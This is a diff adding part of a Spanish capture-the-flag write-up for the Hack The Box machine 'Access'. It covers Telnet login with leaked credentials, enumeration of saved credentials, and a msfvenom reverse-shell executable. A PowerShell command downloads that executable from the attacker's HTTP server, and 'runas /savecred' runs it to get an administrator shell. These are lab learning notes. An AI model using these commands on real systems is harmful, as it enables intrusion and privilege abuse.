@@ -266,3 +266,194 @@ Como salida obtenemos un correo electrónico enviado desde la dirección 'john@m
 
 Telnet
 ------
+
+Con la salida de nmap, se sabe que el puerto 23 está abierto y es donde se encuentra el servicio Telnet. Con las credenciales obtenidas a través del correo electrónico, 'security':'4Cc3ssC0ntr0ller', trataré de conectarme al servidor.<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb]
+    └─# telnet 10.10.10.98          
+    Trying 10.10.10.98...
+    Connected to 10.10.10.98.
+    Escape character is '^]'.
+    Welcome to Microsoft Telnet Service 
+
+    login: security
+    password: 
+
+    *===============================================================
+    Microsoft Telnet Server.
+    *===============================================================
+    C:\Users\security>cd Desktop
+
+    C:\Users\security\Desktop>dir
+    Volume in drive C has no label.
+    Volume Serial Number is 8164-DB5F
+
+    Directory of C:\Users\security\Desktop
+
+    08/28/2018  06:51 AM    <DIR>          .
+    08/28/2018  06:51 AM    <DIR>          ..
+    01/21/2024  12:07 PM                34 user.txt
+                1 File(s)             34 bytes
+                2 Dir(s)   3,346,747,392 bytes free
+
+    C:\Users\security\Desktop>more "user.txt"
+    bd00804d27d7876ad17354e0a5b63808
+
+    C:\Users\security\Desktop>
+
+Efectivamente, las credenciales son válidas y consigo acceso como usuario 'security'. Entrando en el directorio 'Desktop' se puede encontrar el flag del usuario dentro del archivo 'user.txt'.
+
+Escalado de privilegios
+------
+
+Una vez que se tiene acceso como usuario, siempre hay que tratar de conseguir los privilegios máximos. Para ello debe realizarse un escalado de privilegios para tener un control total del servidor.<br/><br/>
+A través del comando 'cmdkey /list' voy a intentar enumerar algunas credenciales guardadas<br/>
+
+    Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+                                                       Type: Domain Password
+    User: ACCESS\Administrator
+    
+
+    C:\Users\security\Desktop>
+
+Vemos que el usuario 'Administrador' tiene una contraseña guardada.
+
+Metasploit & Msfvenom
+------
+
+En este apartado vamos a crear un payload que nos servirá como reverse shell con ayuda de la herramienta 'Metasploit'.
+
+    ┌──(root㉿kali)-[/home/nico/htb]
+    └─# msfconsole -q                                                                             
+    msf6 > use exploit/multi/handler 
+    [*] Using configured payload generic/shell_reverse_tcp
+    msf6 exploit(multi/handler) > set PAYLOAD windows/x64/shell_reverse_tcp 
+    PAYLOAD => windows/x64/shell_reverse_tcp
+    msf6 exploit(multi/handler) > set LHOST 10.10.14.27
+    LHOST => 10.10.14.27
+    msf6 exploit(multi/handler) > set LPORT 1234
+    LPORT => 1234
+    msf6 exploit(multi/handler) > show options
+
+    Module options (exploit/multi/handler):
+
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+
+
+    Payload options (windows/x64/shell_reverse_tcp):
+
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+    LHOST     10.10.14.27      yes       The listen address (an interface may be specified)
+    LPORT     1234             yes       The listen port
+
+
+    Exploit target:
+
+    Id  Name
+    --  ----
+    0   Wildcard Target
+
+
+
+    View the full module info with the info, or info -d command.
+
+    msf6 exploit(multi/handler) >
+
+He utilizado un payload incluído en la propia herramienta y lo único que he tenido que modificar ha sido el host de escucha, que es mi IP actual '10.10.14.27' y el puerto de escucha, que he elegido '1234'.<br/><br/>
+Lo siguiente fue crear un fichero .exe que será el que enviaré al servidor para que arranque el reverse shell en Metasploit.<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb]
+    └─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.27 LPORT=1234 -f exe -o shell.exe
+    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+    [-] No arch selected, selecting arch: x64 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 460 bytes
+    Final size of exe file: 7168 bytes
+    Saved as: shell.exe
+                                                                                                                                                                
+    ┌──(root㉿kali)-[/home/nico/htb]
+    └─# python3 -m http.server 8000
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+Ahora queda descargar el fichero 'shell.exe' en el servidor y arrancarlo con el comando 'runas' para que utilice las credenciales guardadas del Administrador.<br/>
+
+    C:\Users\security\Links>powershell -command "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.27:8000/shell.exe', 'shell.exe')"
+
+    C:\Users\security\Links>dir
+    Volume in drive C has no label.
+    Volume Serial Number is 8164-DB5F
+
+    Directory of C:\Users\security\Links
+
+    01/21/2024  02:07 PM    <DIR>          .
+    01/21/2024  02:07 PM    <DIR>          ..
+    08/21/2018  10:35 PM               444 Desktop.lnk
+    08/21/2018  10:35 PM               855 Downloads.lnk
+    08/21/2018  10:35 PM               363 RecentPlaces.lnk
+    01/21/2024  02:07 PM             7,168 shell.exe
+                4 File(s)          8,830 bytes
+                2 Dir(s)   3,346,735,104 bytes free
+
+    C:\Users\security\Links>
+
+Para confirmar que se ha descargado correctamente, se puede ver como en mi servidor HTTP se realizó un GET del fichero 'shell.exe'<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb]
+    └─# python3 -m http.server 8000
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+    10.10.14.27 - - [21/Jan/2024 15:07:37] "GET / HTTP/1.1" 200 -
+    10.10.14.27 - - [21/Jan/2024 15:07:37] code 404, message File not found
+    10.10.14.27 - - [21/Jan/2024 15:07:37] "GET /favicon.ico HTTP/1.1" 404 -
+    10.10.10.98 - - [21/Jan/2024 15:07:45] "GET /shell.exe HTTP/1.1" 200 -
+
+Por último arranco el exploit en Metasploit y seguidamente ejecuto el fichero 'shell.exe', obteniendo un reverse shell como usuario administrador<br/>
+
+    C:\Users\security\Links>runas /user:ACCESS\administrator /savecred shell.exe
+
+    C:\Users\security\Links>
+
+<br/>
+
+    msf6 exploit(multi/handler) > exploit
+
+    [*] Started reverse TCP handler on 10.10.14.27:1234 
+    [*] Command shell session 1 opened (10.10.14.27:1234 -> 10.10.10.98:49158) at 2024-01-21 15:11:25 +0100
+
+
+    Shell Banner:
+    Microsoft Windows [Version 6.1.7600]
+    -----
+            
+
+    C:\Windows\system32>whoami
+    whoami
+    access\administrator
+
+    C:\Windows\system32>cd ../../Users/Administrator/Desktop
+    cd ../../Users/Administrator/Desktop
+
+    C:\Users\Administrator\Desktop>dir
+    dir
+    Volume in drive C has no label.
+    Volume Serial Number is 8164-DB5F
+
+    Directory of C:\Users\Administrator\Desktop
+
+    07/14/2021  02:40 PM    <DIR>          .
+    07/14/2021  02:40 PM    <DIR>          ..
+    01/21/2024  12:07 PM                34 root.txt
+                1 File(s)             34 bytes
+                2 Dir(s)   3,346,735,104 bytes free
+
+    C:\Users\Administrator\Desktop>type root.txt
+    type root.txt
+    3af9de75e13f107ab3d4e61f585a7fd4
+
+    C:\Users\Administrator\Desktop>
+
+Como se puede ver, el flag del root se encuentra en el directorio Desktop bajo el nombre 'root.txt'.
